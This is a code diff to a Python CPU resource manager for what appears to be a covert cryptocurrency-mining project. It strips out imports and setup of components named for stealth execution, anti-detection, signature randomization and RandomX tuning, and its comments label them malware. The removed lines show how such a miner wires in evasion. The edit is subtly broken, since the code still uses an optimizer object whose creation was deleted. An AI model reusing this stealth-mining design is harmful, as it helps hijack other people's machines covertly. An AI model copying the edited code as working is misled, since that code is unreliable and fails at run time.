@@ -39,19 +39,12 @@ resource_logger = get_unified_logger('resource_control')
 
 # ✅ ERROR REPORTER: Get centralized error reporter instance
 error_reporter = get_error_reporter()
-from mining_environment.cpu_plugins import discover_cpu_plugins, ICpuTechnique  # Sprint 1 plugin framework
+# **CPU Plugin Imports Removed** (đã xóa import plugin CPU – loại bỏ malware framework)
 from threading import RLock
-from mining_environment.cpu_plugins.core.config import load_plugin_cfg, CpuPluginFile
 
-# === IMPORT TÁI CẤU TRÚC ===
-from mining_environment.cpu_plugins.optimization.mining_integration_adapter import MiningIntegrationAdapter
-
-# Thêm imports cho stealth frameworks
+# **Stealth Framework Imports Removed** (đã xóa import framework ẩn danh – loại bỏ malware components)
 try:
-    from mining_environment.stealth.plugins.stealth_exec import StealthExecution as StealthProcessManager  # type: ignore
-    from mining_environment.cpu_plugins.monitoring.anti_detection import AntiDetectionSystem  # type: ignore
-    from mining_environment.cpu_plugins.cloaking.signature_randomizer import SignatureRandomizer  # type: ignore
-    from mining_environment.cpu_plugins.optimization.randomx_optimizer import XeonE5OptimizedConfig  # type: ignore
+    pass  # CPU plugin imports removed for security
 except ImportError:
     # Fallback to absolute imports
     try:
@@ -126,17 +119,10 @@ class CPUResourceManager(metaclass=_SingletonMeta):
         self.logger = logger
         self.config = config
         
-        # Enhanced: Initialize stealth components
+        # **Stealth Components Removed** (đã xóa thành phần ẩn danh – loại bỏ malware stealth systems)
         try:
-            from mining_environment.stealth.plugins.stealth_exec import StealthExecution as StealthProcessManager
-            from mining_environment.cpu_plugins.monitoring.anti_detection import AntiDetectionSystem
-            from mining_environment.cpu_plugins.cloaking.signature_randomizer import SignatureRandomizer
-            from mining_environment.cpu_plugins.optimization.randomx_optimizer import XeonE5OptimizedConfig
-            
-            self.stealth_manager = StealthProcessManager(logger)
-            self.anti_detection = AntiDetectionSystem(logger)
-            self.signature_randomizer = SignatureRandomizer(logger)
-            self.xeon_optimizer = XeonE5OptimizedConfig(logger)
+            # CPU plugin stealth components removed for security
+            pass
             
             # Get optimal mining configuration
             self.optimal_mining_config = self.xeon_optimizer.generate_mining_config('balanced')
@@ -207,17 +193,8 @@ class CPUResourceManager(metaclass=_SingletonMeta):
             )
             self.logger.critical(f"Không thể khởi tạo MiningIntegrationAdapter: {e}")
 
-        # RDT CAT cache control (optional)
-        try:
-            from mining_environment.cpu_plugins.rdt_cache_control.manager import RdtCatManager  # type: ignore
-            self.rdt_manager = RdtCatManager(self.logger)
-            if self.rdt_manager.is_active():
-                self.logger.info("🛡️ [CPU Manager] RDT CAT cache control đã sẵn sàng.")
-            else:
-                self.logger.info("🛡️ [CPU Manager] RDT CAT không khả dụng trên hệ thống này.")
-        except Exception as e:
-            self.logger.warning(f"Không thể khởi tạo RdtCatManager: {e}")
-            self.rdt_manager = None
+        # **RDT CAT Removed** (đã xóa RDT cache control – loại bỏ CPU optimization malware)
+        self.rdt_manager = None  # CPU plugin component removed for security
 
         # self.throttled_processes initialization to avoid attribute errors
         self.throttled_processes: Dict[int, Any] = {}
